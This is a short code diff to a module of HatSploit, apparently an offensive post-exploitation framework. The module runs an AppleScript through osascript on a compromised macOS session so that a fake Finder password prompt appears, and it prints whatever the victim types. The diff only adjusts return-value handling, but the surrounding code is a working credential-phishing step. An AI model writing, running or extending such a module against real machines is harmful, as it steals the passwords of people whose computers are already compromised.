@@ -61,6 +61,7 @@ class HatSploitModule:
         session = self.sessions.get_session("macos/membrane", self.parser.parse_options(self.options))
         if session:
             self.badges.output_process("Waiting for prompt window to appear...")
+
             payload = """
             tell application "Finder"
                 activate
@@ -80,8 +81,9 @@ class HatSploitModule:
             end tell
             """
             self.badges.output_process("Waiting for user to type password...")
-            status, output = session.send_command("osascript", payload)
-            if not status:
+
+            output = session.send_command("osascript", payload)
+            if not output:
                 self.badges.output_error("Failed to prompt user to type password!")
             else:
                 self.badges.output_information("User Entered: " + output)
